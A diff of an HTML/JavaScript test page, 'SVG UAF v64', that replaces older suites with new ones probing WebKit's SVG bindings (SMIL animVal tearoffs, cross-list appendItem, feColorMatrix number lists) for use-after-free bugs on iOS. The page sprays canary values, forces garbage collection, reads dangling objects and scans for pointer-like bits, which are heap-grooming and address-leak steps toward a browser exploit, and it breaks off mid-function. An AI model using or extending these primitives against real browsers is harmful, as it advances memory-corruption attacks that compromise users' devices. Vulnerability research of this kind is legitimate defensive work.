@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v57 — ref-drop primitives: setMatrix/adoptNode/detach</title>
+<title>SVG UAF v64 — SMIL animation UAF + cross-list insert + animVal dangling</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,13 +22,14 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v57 — ref-drop: setMatrix / adoptNode / SVGTransformList.initialize</h2>
+<h2>SVG UAF v64 — SMIL animation UAF + animVal/baseVal divergence + cross-list insert</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR21')">ADR21: SVGTransformList.initialize ref-drop</button>
-  <button onclick="runSuite('ADR22')">ADR22: document.adoptNode C++ detach</button>
-  <button onclick="runSuite('ADR23')">ADR23: setMatrix copy-and-forget</button>
-  <button onclick="runSuite('ADR24')">ADR24: SVGMatrix via replaceItem canary</button>
+  <button onclick="runSuite('ADR49')">ADR49: animVal vs baseVal separate backing test</button>
+  <button onclick="runSuite('ADR50')">ADR50: SMIL animation UAF — animVal TearOff after element remove</button>
+  <button onclick="runSuite('ADR51')">ADR51: Cross-list item insert — share item between two lists</button>
+  <button onclick="runSuite('ADR52')">ADR52: SVGNumber fastMalloc Vector backing — reuse after free?</button>
+  <button onclick="runSuite('ADR53')">ADR53: SVGTransformList — transform.matrix pointer via angle confusion</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -64,602 +65,475 @@ function fallbackCopy(text,toast){
   document.body.removeChild(ta);
 }
 
-// ── shared helpers ──────────────────────────────────────────────
 var _dv=new DataView(new ArrayBuffer(8));
 function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
 function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
-function isPointerLike(f){
-  if(!isFinite(f)||isNaN(f)||f<=0)return false;
-  return f>=(1<<28)&&f<Math.pow(2,48);
+function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
+function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
+function isPointerLike64(f){
+  if(!isFinite(f)||isNaN(f))return false;
+  var b=f64bits(f);
+  return b.hi>=0x00000001&&b.hi<=0x00007fff&&b.lo!==0;
 }
+function isPointerLike32(u){return u>0x10000000&&u<0xfffff000&&u!==0xbbbbbbbb&&u!==0xdddddddd;}
 function makeSVG(){
   var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','2');svg.setAttribute('height','2');
-  svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  svg.setAttribute('width','1');svg.setAttribute('height','1');
   document.body.appendChild(svg);
   return svg;
 }
-function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
-function gcPressure(n){
-  var g=[];
-  for(var i=0;i<(n||100000);i++) g.push({x:i,s:''+i,a:[i]});
-  g=null;
-}
+function gcPressure(n){var a=[];for(var i=0;i<n;i++)a.push({x:i});a=null;}
 function gcHard(){
   gcPressure(500000);
-  var t=new Array(200000).fill(null).map(function(){return new Object();});t=null;
+  var t=new Array(200000).fill(null).map(function(){return{};});t=null;
   gcPressure(300000);
   try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
   gcPressure(200000);
 }
+function gcDOM(){
+  var c=document.createElement('div');document.body.appendChild(c);
+  for(var i=0;i<5000;i++){var el=document.createElement('span');c.appendChild(el);}
+  c.innerHTML='';c.remove();
+  for(var j=0;j<500;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
+}
+function gcFull(){gcHard();gcDOM();gcHard();}
+function gcFrames(n,cb){
+  var rem=n;
+  function frame(){gcFull();rem--;if(rem>0)requestAnimationFrame(frame);else if(cb)cb();}
+  requestAnimationFrame(frame);
+}
 
-// Make a fresh SVGTransform with a matrix, return {svg, g, xf, matrix}
-function makeTransformMatrix(svg){
+var suites={};
+function runSuite(name){L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');suites[name]();}
+function runAll(){['ADR49','ADR50','ADR51','ADR52','ADR53'].forEach(function(n){runSuite(n);});}
+
+// Helper: create feColorMatrix with N values
+function makeFeColorMatrix(svg,defs,vals){
+  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
+  fe.setAttribute('type','matrix');
+  fe.setAttribute('values',vals.join(' '));
+  defs.appendChild(fe);
+  return fe;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// ADR49 — animVal vs baseVal separate backing test
+// When a SMIL animation is NOT running: animVal === baseVal backing?
+// When running: animVal gets its own interpolated C++ backing?
+// Test 1: no animation — does setting baseVal affect animVal item?
+// Test 2: with <animate> element added — do items diverge?
+// ═══════════════════════════════════════════════════════════════
+suites['ADR49']=function(){
+  L('ADR49: animVal vs baseVal divergence','info');
+  var svg=makeSVG();
+  var defs=document.createElementNS(SVG_NS,'defs');
+  svg.appendChild(defs);
+  var vals=[];for(var i=0;i<20;i++)vals.push(i===0?100:0);
+  var fe=makeFeColorMatrix(svg,defs,vals);
+
+  var bv=fe.values.baseVal;
+  var av=fe.values.animVal;
+  var bvItem=bv.getItem(0);
+  var avItem=av.getItem(0);
+
+  L('ADR49 T1 no-anim: bv[0]='+bvItem.value+' av[0]='+avItem.value,'info');
+  L('ADR49 T1: bv===av? '+(bv===av)+' bvItem===avItem? '+(bvItem===avItem),'info');
+
+  // Modify via baseVal, check animVal
+  bvItem.value=777.0;
+  L('ADR49 T1 after bv set: bv[0]='+bvItem.value+' av[0]='+avItem.value,'info');
+  L('ADR49 T1: '+(avItem.value===777?'SHARED BACKING (same object)':'SEPARATE BACKING'),'info');
+
+  // T2: add <animate> to create animation
+  L('ADR49 T2: adding SMIL <animate> element','info');
+  var anim=document.createElementNS(SVG_NS,'animate');
+  anim.setAttribute('attributeName','values');
+  anim.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0;200 0 0 0 0  0 200 0 0 0  0 0 200 0 0  0 0 0 200 0');
+  anim.setAttribute('dur','10s');
+  anim.setAttribute('repeatCount','indefinite');
+  fe.appendChild(anim);
+
+  // Try to begin
+  try{anim.beginElement();}catch(e){L('ADR49 beginElement err: '+e.message,'miss');}
+
+  // Grab new animVal ref
+  var avItem2=av.getItem(0);
+  var bvItem2=bv.getItem(0);
+  L('ADR49 T2 with anim: bv[0]='+bvItem2.value+' av[0]='+avItem2.value,'info');
+  L('ADR49 T2: bvItem2===avItem2? '+(bvItem2===avItem2),'info');
+
+  // Wait for animation to maybe tick
+  setTimeout(function(){
+    try{
+      var bvNow=bv.getItem(0).value;
+      var avNow=av.getItem(0).value;
+      L('ADR49 T2 after 100ms: bv[0]='+bvNow+' av[0]='+avNow,'info');
+      if(Math.abs(avNow-bvNow)>0.1){
+        L('★ ADR49: animVal DIVERGED from baseVal! av='+avNow+' bv='+bvNow,'hit');
+        L('ADR49: animVal has SEPARATE C++ backing during animation!','hit');
+      } else {
+        L('ADR49: no divergence (same backing or anim not active)','info');
+      }
+    }catch(e){L('ADR49 timer err: '+e.message,'miss');}
+    svg.remove();
+  },100);
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR50 — SMIL animation UAF
+// Goal: get TearOff to animVal item that has separate C++ backing,
+//        then destroy the animation/element → C++ backing freed?
+//
+// In WebKit: when animation is active, animVal items are TearOffs
+// pointing into the SVGAnimatedListPropertyTearOff's "animated" list.
+// When the animation is removed/stopped, that animated list might
+// be freed while TearOffs still hold raw ptrs into it.
+//
+// Attack sequence:
+// 1. Create element + animation
+// 2. Start animation
+// 3. Grab animVal TearOff (item from animated backing)
+// 4. Remove animate element (stops animation, animated backing freed?)
+// 5. Read TearOff → dangling?
+// ═══════════════════════════════════════════════════════════════
+suites['ADR50']=function(){
+  L('ADR50: SMIL animation UAF — animVal TearOff after animate removal','info');
+  var svg=makeSVG();
+  svg.setAttribute('width','100');svg.setAttribute('height','100');
+  var defs=document.createElementNS(SVG_NS,'defs');
+  svg.appendChild(defs);
+  var filt=document.createElementNS(SVG_NS,'filter');
+  filt.setAttribute('id','filt50');
+  defs.appendChild(filt);
+
+  var CANARY=54321.0;
+  var vals=[];for(var i=0;i<20;i++)vals.push(i===0?CANARY:0);
+  var fe=makeFeColorMatrix(svg,filt,vals);
+
+  var anim=document.createElementNS(SVG_NS,'animate');
+  anim.setAttribute('attributeName','values');
+  // Start from canary, animate to zero
+  anim.setAttribute('from',vals.join(' '));
+  anim.setAttribute('to','0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 0 0');
+  anim.setAttribute('dur','100s');
+  anim.setAttribute('fill','freeze');
+  fe.appendChild(anim);
+
+  var bv=fe.values.baseVal;
+  var av=fe.values.animVal;
+
+  L('ADR50: pre-anim bv[0]='+bv.getItem(0).value+' av[0]='+av.getItem(0).value,'info');
+
+  try{anim.beginElement();}catch(e){L('ADR50 beginElement err: '+e.message,'miss');}
+
+  // Grab TearOff refs AFTER starting animation
+  var bvTear=bv.getItem(0);
+  var avTear=av.getItem(0);
+  L('ADR50: post-beginElement bv='+bvTear.value+' av='+avTear.value,'info');
+  L('ADR50: avTear===bvTear? '+(avTear===bvTear),'info');
+
+  setTimeout(function(){
+    var bvAfter=bvTear.value;
+    var avAfter=avTear.value;
+    L('ADR50 T1: 100ms later bv='+bvAfter+' av='+avAfter,'info');
+
+    // T2: Remove the <animate> element → animation stops → animated backing freed?
+    L('ADR50 T2: removing <animate> element','info');
+    anim.remove();
+
+    // Read TearOff immediately after animate removal
+    try{
+      var avPost=avTear.value;
+      var bvPost=bvTear.value;
+      L('ADR50 T2 immediately: av='+avPost+' bv='+bvPost,'info');
+      var avBits=f32bits(avPost);
+      var bvBits=f32bits(bvPost);
+      L('ADR50 T2 bits: av='+f32hex(avPost)+' bv='+f32hex(bvPost),'info');
+      if(isPointerLike32(avBits)){
+        L('★★★ ADR50: avTear pointer-like after anim removal! '+f32hex(avPost),'hit');
+      } else if(avPost===CANARY){
+        L('ADR50: avTear still=CANARY (anim backing kept alive or reset)','info');
+      } else if(avPost===0){
+        L('ADR50: avTear=0 (zero-on-free or animation froze at 0)','warn');
+      } else {
+        L('ADR50: avTear='+avPost+' ('+f32hex(avPost)+') — UNKNOWN VALUE','warn');
+      }
+    }catch(e){L('ADR50 T2 err: '+e.message,'miss');}
+
+    // T3: Remove entire element
+    L('ADR50 T3: removing feColorMatrix element','info');
+    fe.remove();
+    try{
+      var avT3=avTear.value;
+      L('ADR50 T3 after fe.remove: av='+f32hex(avT3)+(avT3===0?' ZERO':'★NON-ZERO'),'warn');
+      if(isPointerLike32(f32bits(avT3)))L('★★★ ADR50 T3: POINTER in av after element remove!','hit');
+    }catch(e){L('ADR50 T3 err: '+e.message,'miss');}
+
+    // T4: Remove defs+svg
+    L('ADR50 T4: removing svg','info');
+    svg.remove();
+    try{
+      var avT4=avTear.value;
+      var avT4bits=f32bits(avT4);
+      L('ADR50 T4 after svg.remove: av='+avT4+' bits='+f32hex(avT4),'warn');
+      if(isPointerLike32(avT4bits))L('★★★ ADR50 T4: POINTER in avTear! '+f32hex(avT4),'hit');
+      else if(avT4===0)L('ADR50 T4: ZERO (zeroed on free)','info');
+      else L('ADR50 T4: non-zero non-pointer: '+f32hex(avT4),'warn');
+    }catch(e){L('ADR50 T4 err: '+e.message,'miss');}
+  },50);
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR51 — Cross-list item sharing
+// appendItem from list A → list B creates a shared item?
+// Or does it clone? Test:
+// 1. Create list A with item[0].value=111
+// 2. appendItem(A.getItem(0)) into list B
+// 3. Modify via A, read via B → shared or cloned?
+// 4. Remove A from DOM, destroy all refs to A
+// 5. Read from B's copy → still valid?
+//
+// If WebKit uses RefPtr sharing: B holds ref, A's removal doesn't free item.
+// If WebKit clones: independent, no cross-ref.
+// ═══════════════════════════════════════════════════════════════
+suites['ADR51']=function(){
+  L('ADR51: Cross-list item insert (shared or cloned?)','info');
+
+  var svgA=makeSVG(),svgB=makeSVG();
+  var defsA=document.createElementNS(SVG_NS,'defs');
+  var defsB=document.createElementNS(SVG_NS,'defs');
+  svgA.appendChild(defsA);svgB.appendChild(defsB);
+
+  var valsA=[];for(var i=0;i<20;i++)valsA.push(i===0?111:0);
+  var valsB=[];for(var i=0;i<20;i++)valsB.push(0);
+  var feA=makeFeColorMatrix(svgA,defsA,valsA);
+  var feB=makeFeColorMatrix(svgB,defsB,valsB);
+
+  var bvA=feA.values.baseVal;
+  var bvB=feB.values.baseVal;
+  var itemA=bvA.getItem(0); // value=111
+
+  L('ADR51 T1: itemA='+itemA.value,'info');
+
+  // appendItem(itemA) into bvB
+  try{
+    bvB.appendItem(itemA);
+    var appendedItem=bvB.getItem(bvB.length-1);
+    L('ADR51 T1: appended. bvB.len='+bvB.length+' appended.value='+appendedItem.value,'info');
+    L('ADR51 T1: itemA===appendedItem? '+(itemA===appendedItem),'info');
+    L('ADR51 T1: itemA.value===appendedItem.value? '+(itemA.value===appendedItem.value),'info');
+
+    // Modify via A, check via appended
+    itemA.value=999.0;
+    L('ADR51 T2: after itemA.value=999: itemA='+itemA.value+' appended='+appendedItem.value,'info');
+    if(appendedItem.value===999.0){
+      L('★ ADR51: SHARED object! same C++ item in both lists','hit');
+    } else {
+      L('ADR51: CLONED (independent copies). appended='+appendedItem.value,'info');
+    }
+
+    // Modify via appended, check via A
+    appendedItem.value=7777.0;
+    L('ADR51 T3: after appended.value=7777: appended='+appendedItem.value+' itemA='+itemA.value,'info');
+
+    // Now remove list A's element entirely
+    L('ADR51 T4: destroying list A (feA.remove + svgA.remove)','info');
+    feA.remove();defsA.remove();svgA.remove();
+
+    // Read from itemA (now zombie) and from appendedItem (held by B's list)
+    try{
+      var itemAPost=itemA.value;
+      L('ADR51 T4: itemA.value post-A-destroy='+itemAPost+' bits='+f32hex(itemAPost),'warn');
+      if(isPointerLike32(f32bits(itemAPost)))L('★★★ ADR51 itemA pointer-like!','hit');
+    }catch(e){L('ADR51 T4 itemA err: '+e.message,'miss');}
+
+    try{
+      var appendedPost=appendedItem.value;
+      L('ADR51 T4: appendedItem.value post-A-destroy='+appendedPost,'info');
+    }catch(e){L('ADR51 T4 appendedItem err: '+e.message,'miss');}
+
+  }catch(e){
+    L('ADR51 appendItem err: '+e.message,'miss');
+    L('ADR51: appendItem rejected cross-list (WebKit validates list membership)','info');
+  }
+
+  svgB.remove();
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR52 — SVGNumber Vector backing reuse after free
+// SVGNumberList stores items in a Vector<RefPtr<SVGNumber>>.
+// The Vector backing buffer uses fastMalloc (not IsoHeap).
+// Hypothesis: fastMalloc allocations on iOS 26.5.2 may NOT be
+//              zeroed on free (unlike IsoHeap which is always zeroed).
+//
+// Test:
+// 1. Alloc large SVGNumberList (100 items) — Vector backing ~800 bytes
+// 2. Write canary values to items via baseVal
+// 3. Destroy element + null all JS refs → Vector backing freed
+// 4. Allocate new SVGNumberList of same size
+// 5. Read items from new list → do any show canary values?
+//    (If yes: Vector backing NOT zero-on-free'd for fastMalloc)
+//
+// Secondary: can we directly observe the Vector reuse?
+// ═══════════════════════════════════════════════════════════════
+suites['ADR52']=function(){
+  L('ADR52: fastMalloc Vector backing reuse test','info');
+  var CANARY_F32=33333.332;
+  _dv.setFloat32(0,CANARY_F32,true);
+  var CANARY_BITS=_dv.getUint32(0,true);
+  L('ADR52 canary='+CANARY_F32+' bits='+f32hex(CANARY_F32),'info');
+
+  // Create large lists (each list backing ≈ N×8 bytes for RefPtr<SVGNumber>)
+  var N=100; // 100 items × 8 bytes = 800 bytes Vector backing
+  var BATCHES=50; // 50 lists total = 50×800 = 40KB of Vector backings
+
+  function allocList(n,canary){
+    var svg=makeSVG();
+    var defs=document.createElementNS(SVG_NS,'defs');
+    svg.appendChild(defs);
+    var vals=[];for(var i=0;i<n;i++)vals.push(canary);
+    var fe=makeFeColorMatrix(svg,defs,vals);
+    return {svg:svg,defs:defs,fe:fe,bv:fe.values.baseVal};
+  }
+
+  // Phase 1: alloc BATCHES lists with canary values, then destroy all
+  L('ADR52 phase1: allocating '+BATCHES+' lists of '+N+' items each','info');
+  var lists=[];
+  for(var b=0;b<BATCHES;b++){
+    var l=allocList(N,CANARY_F32);
+    lists.push(l);
+  }
+
+  // Destroy all lists
+  for(var i=0;i<lists.length;i++){
+    lists[i].fe.remove();
+    lists[i].defs.remove();
+    lists[i].svg.remove();
+  }
+  lists=null;
+
+  // Force GC to actually release the C++ objects
+  gcFull();
+
+  // Phase 2: alloc fresh lists with ZERO values, read and check for canary
+  L('ADR52 phase2: allocating fresh lists with zero values','info');
+  var canaryFound=0;
+  var freshLists=[];
+  for(var b2=0;b2<BATCHES;b2++){
+    var fl=allocList(N,0);
+    freshLists.push(fl);
+    // Scan items for canary
+    for(var j=0;j<N;j++){
+      var v=fl.bv.getItem(j).value;
+      var vbits=f32bits(v);
+      if(Math.abs(v-CANARY_F32)<1.0){
+        canaryFound++;
+        L('★ ADR52: CANARY found in fresh list ['+b2+']['+j+']='+v+' bits='+f32hex(v),'hit');
+      } else if(v!==0&&isPointerLike32(vbits)){
+        L('★ ADR52: pointer-like in fresh list ['+b2+']['+j+']='+f32hex(v),'warn');
+      }
+    }
+  }
+
+  L('ADR52 scan done: canaryFound='+canaryFound+'/'+BATCHES*N,canaryFound>0?'hit':'info');
+  if(canaryFound===0)L('ADR52: no canary — fastMalloc also zero-on-free, OR lists did not reuse same memory','info');
+
+  for(var i=0;i<freshLists.length;i++){
+    freshLists[i].fe.remove();freshLists[i].defs.remove();freshLists[i].svg.remove();
+  }
+  freshLists=null;
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR53 — SVGTransformList angle/matrix confusion
+// SVGTransform layout (approximate):
+//   SVGTransformTearOff: { vtable(8), m_animatedProperty*(8), m_value*(8), ... }
+//   SVGTransform C++ struct:
+//     float m_angle           ← transform.angle reads this (float32)
+//     int m_type              ← transform.type reads this (int32)
+//     AffineTransform m_matrix ← transform.matrix gives SVGMatrix
+//
+// Goal: Write specific float32 bit patterns to .angle,
+//       then read .matrix fields to see if any field reads
+//       at an offset that overlaps with m_angle's memory.
+//
+// Also: SVGTransform.setRotate(angle, cx, cy) → transform stores angle+cx+cy
+// Can we then read matrix to find those values at wrong offsets?
+// ═══════════════════════════════════════════════════════════════
+suites['ADR53']=function(){
+  L('ADR53: SVGTransformList — angle vs matrix layout confusion','info');
+  var svg=makeSVG();
+  svg.setAttribute('width','100');svg.setAttribute('height','100');
   var g=document.createElementNS(SVG_NS,'g');
   svg.appendChild(g);
-  var xf=svg.createSVGTransform();
-  g.transform.baseVal.appendItem(xf);
-  var m=g.transform.baseVal.getItem(0).matrix;
-  return {g:g, xf:g.transform.baseVal.getItem(0), list:g.transform.baseVal, matrix:m};
-}
 
-// inverse oracle — ref-counts new SVGMatrix, immediately orphans it
-function inverseOracle(K){
-  var svg=makeSVG();
-  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
-  var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
-  var m=g.transform.baseVal.getItem(0).matrix;
-  m.a=1/K;m.b=0;m.c=0;m.d=K;m.e=0;m.f=0;
-  var inv=m.inverse();
-  var result=inv.a;
-  g.transform.baseVal.removeItem(0);
-  g.parentNode.removeChild(g);removeSVG(svg);
-  return result;
-}
+  // Get SVGTransformList
+  var tl=g.transform.baseVal;
+  var t=svg.createSVGTransform();
 
-// ─────────────────────────────────────────────────────────────────
-// ADR23 — setMatrix() copy-and-forget ref-drop
-//
-// SVGTransform.setMatrix(SVGMatrix m) is specced as:
-//   "Set the transform type to SVG_TRANSFORM_MATRIX, with parameter
-//    matrix defining the new transformation. Note that the values
-//    from the parameter matrix are copied."
-//
-// "Values from the parameter matrix are COPIED" — if this is a true
-// copy with no retained ref, then after setMatrix() returns:
-//   - the transform's internal AffineTransform has the values
-//   - the original SVGMatrix C++ object's refcount drops by 1
-//   - if that was the last ref (only JS wrapper held it), it goes to 0
-//   - IsoHeap slot freed
-//   - NEXT alloc of an SVGMatrix might get that slot
-//
-// Strategy:
-//   1. Alloc SVGMatrix M, write canary float64 values
-//   2. Call someTransform.setMatrix(M) — triggers the copy
-//   3. Drop M (null the variable) + drop the transform
-//   4. GC pressure
-//   5. Alloc fresh SVGMatrix, check for canary
-// ─────────────────────────────────────────────────────────────────
-function runADR23(){
-  L('','suite-hdr');L('ADR23: setMatrix() copy-and-forget ref-drop');
+  // T1: identity matrix — what are the raw float values?
+  tl.appendItem(t);
+  var m=t.matrix;
+  L('ADR53 T1 identity: a='+f64hex(m.a)+' b='+f64hex(m.b)+' c='+f64hex(m.c)+' d='+f64hex(m.d),'info');
+  L('ADR53 T1 identity: e='+f64hex(m.e)+' f='+f64hex(m.f)+' angle='+t.angle+' type='+t.type,'info');
 
-  var svg=makeSVG();
-  var CANARY_A=8.88888888e13;
-  var CANARY_E=7.77777777e13;
-  var N=300;
+  // T2: setRotate with weird angle — does it affect matrix.a or matrix.b differently?
+  var CANARY_ANGLE=12345.6789;
+  t.setRotate(CANARY_ANGLE,0,0);
+  var m2=t.matrix;
+  L('ADR53 T2 rotate('+CANARY_ANGLE+'): angle='+t.angle,'info');
+  L('ADR53 T2 matrix.a='+f64hex(m2.a)+' b='+f64hex(m2.b),'info');
+  L('ADR53 T2 matrix.e='+f64hex(m2.e)+' f='+f64hex(m2.f),'info');
 
-  // Test 1: confirm setMatrix copies values
-  var t=makeTransformMatrix(svg);
-  var mSrc=svg.createSVGMatrix();
-  mSrc.a=CANARY_A;mSrc.b=1.11;mSrc.c=2.22;mSrc.d=CANARY_A/2;mSrc.e=CANARY_E;mSrc.f=CANARY_E/2;
-  t.xf.setMatrix(mSrc);
-  var mAfter=t.list.getItem(0).matrix;
-  L('ADR23: [T1] after setMatrix: mAfter.a='+mAfter.a+' mSrc.a='+mSrc.a+' copied='+(mAfter.a===mSrc.a));
-  L('ADR23: [T1] mAfter.e='+mAfter.e+' mSrc.e='+mSrc.e+' copied='+(mAfter.e===mSrc.e));
-  // Modify mSrc after setMatrix — if truly copied, mAfter should NOT change
-  var oldA=mAfter.a;
-  mSrc.a=999999;
-  L('ADR23: [T1] after mSrc.a=999999: mAfter.a='+mAfter.a+' unchanged='+(mAfter.a===oldA)+' (true=deep copy, false=shared ref!)');
-  t.g.parentNode.removeChild(t.g);
+  // T3: setScale — look for float patterns
+  var t3=svg.createSVGTransform();
+  t3.setScale(1e100,1e-100);
+  tl.appendItem(t3);
+  var m3=t3.matrix;
+  L('ADR53 T3 scale(1e100,1e-100): a='+f64hex(m3.a)+' d='+f64hex(m3.d),'info');
+  L('ADR53 T3: angle='+t3.angle+' type='+t3.type,'info');
 
-  // Test 2: THE KEY TEST — canary spray via setMatrix path
-  // Phase A: spray N matrices, call setMatrix for each, then drop ALL refs
-  L('ADR23: [T2] spraying '+N+' matrices via setMatrix path...');
-  (function phaseA(){
-    var svgInner=makeSVG();
-    // One reusable transform target
-    var g=document.createElementNS(SVG_NS,'g');svgInner.appendChild(g);
-    var xf=svgInner.createSVGTransform();g.transform.baseVal.appendItem(xf);
-    var xfRef=g.transform.baseVal.getItem(0);
+  // T4: Read matrix on DOM-zombie transform (parent removed)
+  L('ADR53 T4: DOM-zombie transform read','info');
+  var t4=svg.createSVGTransform();
+  var CX=314159.0,CY=271828.0,AANGLE=137.0;
+  t4.setRotate(AANGLE,CX,CY);
+  tl.appendItem(t4);
+  L('ADR53 T4 pre-remove: angle='+t4.angle+' cx known='+CX+' cy known='+CY,'info');
+  var m4pre=t4.matrix;
+  L('ADR53 T4 pre-remove: e='+m4pre.e+' f='+m4pre.f,'info');
 
-    for(var k=0;k<N;k++){
-      var m=svg.createSVGMatrix();
-      m.a=CANARY_A+k;m.b=1.5+k*0.001;m.c=2.5+k*0.001;m.d=CANARY_A-k;m.e=CANARY_E+k*2;m.f=CANARY_E+k*3;
-      // "Copy" the matrix into the transform — drops C++ ref if it's a real copy
-      xfRef.setMatrix(m);
-      // m goes out of scope — if setMatrix deep-copied, C++ ref count may hit 0
-    }
-    // Also drop the transform
-    g.transform.baseVal.removeItem(0);
-    g.parentNode.removeChild(g);
-    removeSVG(svgInner);
-    // xfRef goes out of scope too
-  })();
-
-  gcHard();
-
-  L('ADR23: [T2] GC done, allocating '+N+' fresh standalone matrices...');
-  var hits=[];
-  for(var k=0;k<N;k++){
-    var mNew=svg.createSVGMatrix();
-    var snap={a:mNew.a,b:mNew.b,c:mNew.c,d:mNew.d,e:mNew.e,f:mNew.f};
-    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
-      hits.push(k);
-      if(hits.length<=8){
-        L('ADR23: ★ fresh['+k+']: a='+snap.a+' e='+snap.e+' '+f64hex(snap.e),'hit');
-        L('ADR23:   bits a='+f64hex(snap.a)+' d='+f64hex(snap.d),'hit');
-      }
-    }
-    for(var field of['a','b','c','d','e','f']){
-      if(isPointerLike(snap[field])){
-        L('ADR23: ★★ ['+k+'].'+field+'='+snap[field]+' PTR-LIKE! oracle='+inverseOracle(snap[field]),'hit');
-      }
-    }
-  }
-  L('ADR23: [T2] dirty='+hits.length+'/'+N+(hits.length>0?' ★ REF DROPPED!':'clean — setMatrix retains ref'));
-
-  // Test 3: same but using transform-path matrix as the source
-  L('ADR23: [T3] setMatrix with transform-path orphan as source...');
-  (function phaseB(){
-    for(var k=0;k<N;k++){
-      var svgB=makeSVG();
-      var g=document.createElementNS(SVG_NS,'g');svgB.appendChild(g);
-      var xf=svgB.createSVGTransform();g.transform.baseVal.appendItem(xf);
-      var m=g.transform.baseVal.getItem(0).matrix;
-      m.a=CANARY_A+k;m.b=3.5+k*0.001;m.c=4.5+k*0.001;m.d=CANARY_A-k;m.e=CANARY_E+k*4;m.f=CANARY_E+k*5;
-
-      // Get a second transform to call setMatrix on
-      var g2=document.createElementNS(SVG_NS,'g');svgB.appendChild(g2);
-      var xf2=svgB.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
-      var xfRef2=g2.transform.baseVal.getItem(0);
-      xfRef2.setMatrix(m);
-
-      // Drop everything — removeItem first to drop list's ref, then DOM removal
-      g.transform.baseVal.removeItem(0);
-      g2.transform.baseVal.removeItem(0);
-      g.parentNode.removeChild(g);
-      g2.parentNode.removeChild(g2);
-      removeSVG(svgB);
-      // m, xfRef2 out of scope
-    }
-  })();
-
-  gcHard();
-
-  var hits3=[];
-  for(var k=0;k<N;k++){
-    var mNew2=svg.createSVGMatrix();
-    var snap={a:mNew2.a,b:mNew2.b,c:mNew2.c,d:mNew2.d,e:mNew2.e,f:mNew2.f};
-    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
-      hits3.push(k);
-      if(hits3.length<=8){
-        L('ADR23: [T3] ★ fresh['+k+']: e='+snap.e+' '+f64hex(snap.e),'hit');
-        for(var field of['a','b','c','d','e','f']){
-          if(isPointerLike(snap[field])) L('ADR23: [T3] ★★ PTR-LIKE! '+field+'='+snap[field],'hit');
-        }
-      }
-    }
-  }
-  L('ADR23: [T3] dirty='+hits3.length+'/'+N+(hits3.length>0?' ★ REF DROPPED!':'clean'));
-
-  removeSVG(svg);
-  L('ADR23: done');
-}
-
-// ─────────────────────────────────────────────────────────────────
-// ADR21 — SVGTransformList.initialize() ref-drop
-//
-// SVGTransformList.initialize(newItem) spec:
-//   "Clears all existing current items from the list and re-initializes
-//    the list to hold the single item specified by the parameter."
-//
-// When the list is cleared, all internal SVGTransform C++ objects
-// held by the list should have their refcounts decremented.
-// If a JS wrapper was the ONLY remaining ref to any of those objects,
-// they get freed.
-//
-// Strategy: build a list with many transforms, get their matrices,
-// call initialize() to clear the list, then check if the C++ matrix
-// objects are still readable/reusable.
-// ─────────────────────────────────────────────────────────────────
-function runADR21(){
-  L('','suite-hdr');L('ADR21: SVGTransformList.initialize() ref-drop');
-
-  var svg=makeSVG();
-  var CANARY=9.99999999e13;
-  var N=200;
-
-  // Test 1: basic initialize() behavior
-  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
-  var list=g.transform.baseVal;
-  // Build 5 transforms
-  var matrices=[];
-  for(var i=0;i<5;i++){
-    var xf=svg.createSVGTransform();
-    list.appendItem(xf);
-    var m=list.getItem(i).matrix;
-    m.a=10+i;m.e=100+i;
-    matrices.push(m);
-  }
-  L('ADR21: [T1] list.length before initialize='+list.length);
-  L('ADR21: [T1] matrices[0].a='+matrices[0].a+' matrices[4].a='+matrices[4].a);
-
-  // initialize() with a fresh transform
-  var freshXf=svg.createSVGTransform();
-  list.initialize(freshXf);
-  L('ADR21: [T1] list.length after initialize='+list.length+' (expected 1)');
-
-  // Are the old matrices still readable?
-  L('ADR21: [T1] matrices[0].a after initialize='+matrices[0].a+' (still alive: '+(matrices[0].a===10)+')');
-  L('ADR21: [T1] matrices[4].a after initialize='+matrices[4].a+' (still alive: '+(matrices[4].a===14)+')');
-  // Can we still WRITE to them?
+  svg.remove();
   try{
-    matrices[0].a=999;
-    L('ADR21: [T1] matrices[0].a after write='+matrices[0].a+' writable='+(matrices[0].a===999));
-  }catch(ex){L('ADR21: [T1] write threw: '+ex.message,'warn');}
+    var anglePR=t4.angle;
+    var m4post=t4.matrix;
